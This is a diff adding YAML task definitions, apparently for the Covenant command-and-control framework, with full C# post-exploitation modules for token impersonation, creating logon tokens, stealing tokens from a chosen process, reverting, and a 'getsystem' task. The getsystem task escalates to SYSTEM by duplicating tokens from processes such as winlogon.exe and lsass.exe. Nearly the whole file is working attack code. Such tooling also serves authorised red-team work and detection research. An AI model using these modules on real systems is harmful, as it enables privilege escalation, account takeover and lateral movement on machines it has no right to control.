+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: impersonate
+  Aliases: []
+  Description: Impersonate a user token using P/Invoke LogonUser and ImpersonateLoggedOnUser.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: impersonate /username:admin /domain:. /password:pass123"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool LogonUser(
+            string lpszUsername, string lpszDomain, string lpszPassword,
+            int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool RevertToSelf();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool GetUserName(System.Text.StringBuilder lpBuffer, ref int nSize);
+
+        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
+        private const int LOGON32_PROVIDER_WINNT50 = 3;
+
+        public static string Execute(string Username, string Domain, string Password)
+        {
+            try
+            {
+                IntPtr hToken;
+                if (!LogonUser(Username, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, out hToken))
+                    return "LogonUser failed. Error: " + Marshal.GetLastWin32Error();
+
+                if (!ImpersonateLoggedOnUser(hToken))
+                {
+                    CloseHandle(hToken);
+                    return "ImpersonateLoggedOnUser failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                // Verify impersonation
+                System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
+                int size = sb.Capacity;
+                GetUserName(sb, ref size);
+
+                return "Now impersonating: " + Domain + "\\" + Username + " (verified as: " + sb.ToString() + ")\\nToken handle: 0x" + hToken.ToString("X");
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: Username to impersonate.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: '.'
+    Description: Domain (use . for local).
+    SuggestedValues: ['.']
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password for the user.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: maketoken
+  Aliases: []
+  Description: Create a new logon token using P/Invoke LogonUser (LOGON32_LOGON_NEW_CREDENTIALS).
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: maketoken /username:admin /domain:CORP /password:pass123"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool LogonUser(
+            string lpszUsername, string lpszDomain, string lpszPassword,
+            int dwLogonType, int dwLogonProvider, out IntPtr phToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
+        private const int LOGON32_PROVIDER_WINNT50 = 3;
+
+        public static string Execute(string Username, string Domain, string Password)
+        {
+            try
+            {
+                IntPtr hToken;
+                if (!LogonUser(Username, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, out hToken))
+                    return "LogonUser failed. Error: " + Marshal.GetLastWin32Error();
+
+                if (!ImpersonateLoggedOnUser(hToken))
+                {
+                    CloseHandle(hToken);
+                    return "ImpersonateLoggedOnUser failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                return "Token created for " + Domain + "\\" + Username + ". Network access will use these credentials.\\nToken handle: 0x" + hToken.ToString("X");
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Username
+    Value: ''
+    DefaultValue: ''
+    Description: Username for the token.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Domain
+    Value: ''
+    DefaultValue: ''
+    Description: Domain for the token.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Password
+    Value: ''
+    DefaultValue: ''
+    Description: Password for the token.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: rev2self
+  Aliases: []
+  Description: Revert to the original token using P/Invoke RevertToSelf.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: rev2self"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool RevertToSelf();
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool GetUserName(System.Text.StringBuilder lpBuffer, ref int nSize);
+
+        public static string Execute()
+        {
+            try
+            {
+                if (!RevertToSelf())
+                    return "RevertToSelf failed. Error: " + Marshal.GetLastWin32Error();
+
+                System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
+                int size = sb.Capacity;
+                GetUserName(sb, ref size);
+
+                return "Reverted to self. Current user: " + sb.ToString();
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: stealtoken
+  Aliases: []
+  Description: Steal a token from another process using P/Invoke OpenProcessToken and ImpersonateLoggedOnUser.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: stealtoken /pid:1234"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
+            IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool GetUserName(System.Text.StringBuilder lpBuffer, ref int nSize);
+
+        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        private const uint TOKEN_DUPLICATE = 0x0002;
+        private const uint TOKEN_IMPERSONATE = 0x0004;
+        private const uint TOKEN_QUERY = 0x0008;
+        private const int SecurityImpersonation = 2;
+        private const int TokenPrimary = 1;
+
+        public static string Execute(string Pid)
+        {
+            try
+            {
+                int processId = int.Parse(Pid);
+
+                IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, processId);
+                if (hProcess == IntPtr.Zero)
+                    return "OpenProcess failed. Error: " + Marshal.GetLastWin32Error();
+
+                IntPtr hToken;
+                if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
+                {
+                    CloseHandle(hProcess);
+                    return "OpenProcessToken failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                IntPtr hDupToken;
+                if (!DuplicateTokenEx(hToken, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken))
+                {
+                    CloseHandle(hToken);
+                    CloseHandle(hProcess);
+                    return "DuplicateTokenEx failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                if (!ImpersonateLoggedOnUser(hDupToken))
+                {
+                    CloseHandle(hDupToken);
+                    CloseHandle(hToken);
+                    CloseHandle(hProcess);
+                    return "ImpersonateLoggedOnUser failed. Error: " + Marshal.GetLastWin32Error();
+                }
+
+                System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
+                int size = sb.Capacity;
+                GetUserName(sb, ref size);
+
+                CloseHandle(hToken);
+                CloseHandle(hProcess);
+
+                return "Token stolen from PID " + processId + ". Now impersonating: " + sb.ToString() + "\\nToken handle: 0x" + hDupToken.ToString("X");
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Pid
+    Value: ''
+    DefaultValue: ''
+    Description: Process ID to steal token from.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+
+- Name: getsystem
+  Aliases: []
+  Description: Attempt to get SYSTEM privileges by stealing token from a SYSTEM process.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: getsystem"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,
+            IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool GetUserName(System.Text.StringBuilder lpBuffer, ref int nSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool Process32FirstW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool Process32NextW(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct PROCESSENTRY32W
+        {
+            public uint dwSize;
+            public uint cntUsage;
+            public uint th32ProcessID;
+            public IntPtr th32DefaultHeapID;
+            public uint th32ModuleID;
+            public uint cntThreads;
+            public uint th32ParentProcessID;
+            public int pcPriClassBase;
+            public uint dwFlags;
+            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
+            public string szExeFile;
+        }
+
+        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        private const uint TOKEN_DUPLICATE = 0x0002;
+        private const uint TOKEN_IMPERSONATE = 0x0004;
+        private const uint TOKEN_QUERY = 0x0008;
+        private const int SecurityImpersonation = 2;
+        private const int TokenPrimary = 1;
+        private const uint TH32CS_SNAPPROCESS = 0x00000002;
+
+        public static string Execute()
+        {
+            try
+            {
+                // Target SYSTEM processes to try
+                string[] systemProcs = { "winlogon.exe", "lsass.exe", "services.exe", "csrss.exe", "smss.exe" };
+
+                IntPtr hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                if (hSnap == IntPtr.Zero || hSnap == (IntPtr)(-1))
+                    return "CreateToolhelp32Snapshot failed. Error: " + Marshal.GetLastWin32Error();
+
+                PROCESSENTRY32W pe = new PROCESSENTRY32W();
+                pe.dwSize = (uint)Marshal.SizeOf(pe);
+
+                if (!Process32FirstW(hSnap, ref pe))
+                {
+                    CloseHandle(hSnap);
+                    return "Process32FirstW failed.";
+                }
+
+                do
+                {
+                    string procName = pe.szExeFile.ToLower();
+                    foreach (string target in systemProcs)
+                    {
+                        if (procName == target)
+                        {
+                            string result = TryStealToken((int)pe.th32ProcessID, procName);
+                            if (result.StartsWith("Success"))
+                            {
+                                CloseHandle(hSnap);
+                                return result;
+                            }
+                        }
+                    }
+                } while (Process32NextW(hSnap, ref pe));
+
+                CloseHandle(hSnap);
+                return "Failed to get SYSTEM. Could not steal token from any SYSTEM process. Run as admin first.";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message; }
+        }
+
+        private static string TryStealToken(int pid, string procName)
+        {
+            IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
+            if (hProcess == IntPtr.Zero) return "OpenProcess failed for " + procName;
+
+            IntPtr hToken;
+            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out hToken))
+            {
+                CloseHandle(hProcess);
+                return "OpenProcessToken failed for " + procName;
+            }
+
+            IntPtr hDupToken;
+            if (!DuplicateTokenEx(hToken, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, IntPtr.Zero, SecurityImpersonation, TokenPrimary, out hDupToken))
+            {
+                CloseHandle(hToken);
+                CloseHandle(hProcess);
+                return "DuplicateTokenEx failed for " + procName;
+            }
+
+            if (!ImpersonateLoggedOnUser(hDupToken))
+            {
+                CloseHandle(hDupToken);
+                CloseHandle(hToken);
+                CloseHandle(hProcess);
+                return "ImpersonateLoggedOnUser failed for " + procName;
+            }
+
+            System.Text.StringBuilder sb = new System.Text.StringBuilder(256);
+            int size = sb.Capacity;
+            GetUserName(sb, ref size);
+
+            CloseHandle(hToken);
+            CloseHandle(hProcess);
+
+            return "Success! Got SYSTEM via " + procName + " (PID: " + pid + "). Now: " + sb.ToString();
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
